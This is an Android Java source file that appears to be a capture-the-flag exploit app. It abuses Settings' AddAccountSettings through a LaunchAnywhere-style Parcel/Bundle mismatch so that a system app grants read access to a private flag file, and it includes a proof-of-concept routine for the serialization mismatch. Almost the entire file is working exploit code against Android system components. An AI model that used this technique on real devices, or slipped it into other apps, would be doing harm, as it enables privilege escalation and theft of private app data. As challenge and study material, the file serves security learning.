package com.test.chall_exploit;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.FileProvider;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

import org.lsposed.hiddenapibypass.HiddenApiBypass;

import java.io.File;
import java.util.Arrays;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        HiddenApiBypass.addHiddenApiExemptions("");


        try {
//            poc();
            exp();
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    private void exp() throws PackageManager.NameNotFoundException {
        // Prepare
        Intent intent = new Intent(MainActivity.this, TestActivity.class);
        String dataDir = getPackageManager().getApplicationInfo("com.android.settings", 0).dataDir;
        File flagFile = new File(dataDir + "/files/flag");
        Uri fileUri = FileProvider.getUriForFile(getApplicationContext(), "com.android.settings.files", flagFile);
        intent.setData(fileUri);
        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        Authenticator.payload = intent;
        Authenticator.exploit = new expVulnParcel();

        // Trigger exp
        Intent attacker = new Intent();
        attacker.setComponent(new ComponentName(
                "com.android.settings",
                "com.android.settings.accounts.AddAccountSettings"));
        attacker.setAction(Intent.ACTION_RUN);
        attacker.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        String[] authTypes = {"com.launchanywhere"};
        attacker.putExtra("account_types", authTypes);
        startActivity(attacker);

    }

    private void poc() {
        // 构造我们想让system app执行的intent
        Intent intent = new Intent();
        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        // 第一次读
        expVulnParcel c = new expVulnParcel();
        Parcel expParcel = c.generate(intent);
        Log.d("Pwn", Arrays.toString(expParcel.marshall()));
        for (int i=0; i<3; i+=1) {
            expParcel.readInt();
        }
        expParcel.readString();
        expParcel.readInt(); // 先读掉开头padding的数据
        Log.d("Pwn", "!!!first read");
        Bundle b = expParcel.readBundle();
        Log.d("Pwn", b.toString());
        for (String key : b.keySet()) {
            Log.d("Pwn", key + ": " + b.get(key).getClass().getName());
        }
        // 第一次写之后的第二次读
        Log.d("Pwn", "!!!first write");
        Parcel newParcel = Parcel.obtain();
        newParcel.writeBundle(b);
        newParcel.setDataPosition(0);
        Log.d("Pwn", "!!!second read after writing");
        Bundle bb = newParcel.readBundle();
        Log.d("Pwn", bb.toString());
        for (String key : bb.keySet()) {
            Log.d("Pwn", key + ": " + bb.get(key).getClass().getName());
        }
    }

    private void myTest() {
        // 即使字符串的内容不是可显示字符或提前被0截断，反序列化时依然会按length值读出
        Parcel p1 = Parcel.obtain();
        p1.writeInt(13);
        p1.writeInt(8);
        p1.writeInt(0);
        p1.writeInt(0);
        p1.writeInt(0);
        p1.writeInt(0);
        p1.writeInt(0);
        p1.writeInt(0);
        p1.setDataPosition(0);
        Log.d("Pwn", Arrays.toString(p1.marshall()));
        Log.d("Pwn", p1.readString());
    }
}